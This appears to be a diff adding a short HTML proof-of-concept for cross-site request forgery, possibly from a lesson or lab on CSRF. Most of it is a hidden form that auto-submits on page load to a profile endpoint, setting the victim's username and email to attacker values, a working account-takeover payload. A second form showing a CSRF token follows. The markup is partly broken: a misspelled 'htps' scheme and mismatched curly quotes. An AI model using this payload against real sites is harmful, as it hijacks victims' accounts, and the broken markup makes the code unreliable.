@@ -1,0 +1,18 @@
+<!DOCTYPE HTML>
+<html>
+    <head></head>
+    <body>
+        <form method='post' action='htps://example.com/api/profile'>
+            <input type='hidden' name='username' value="The Attacker">
+            <input type='hidden' name='email' value="the@attacker.com">
+        </form>
+
+        <script>
+              document.forms[0].submit();
+        </script>
+
+<form action=’/api/payment’ method=’post’>
+    <input type=’hidden" name=’CSRFToken’ value=’WfF1szMUHhiokx9AHFply5L2xAOfjRkE’>
+</form>
+    </body>
+</html>
